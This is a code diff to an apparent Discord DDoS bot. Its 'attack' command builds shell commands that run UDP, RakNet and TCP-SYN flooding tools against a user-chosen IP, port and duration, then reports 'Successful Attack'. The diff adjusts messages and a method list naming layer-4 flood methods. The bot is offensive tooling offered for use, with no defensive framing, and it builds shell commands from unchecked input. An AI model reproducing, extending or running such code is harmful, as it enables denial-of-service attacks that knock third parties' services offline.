@@ -132,7 +132,7 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
             temp_file = f.name
 
         comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
-        await ctx.send(f'Successful Attack UDPPayload TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int} Payload:{len(payload)}')
+        await ctx.send(f'Successful Attack UDPPayload TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int} PayloadBytes:{len(payload)}')
 
     elif metodo == 'raknet':
         comando = f'go run raknet.go {ip} {port_int} {tiempo_int}'
@@ -147,6 +147,7 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         await ctx.send(f'Successful Attack TCP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'tcp-syn':
+        #OLD: comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
         comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack TCP-SYN TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
@@ -203,7 +204,7 @@ Methods L4 UDP Protocol:
 
 Methods L4 TCP Protocol:
 • tcp
-• tcp-syn
+• tcp-syn (Multi-threaded)
 • tcp-ack
 • tcp-tls
 
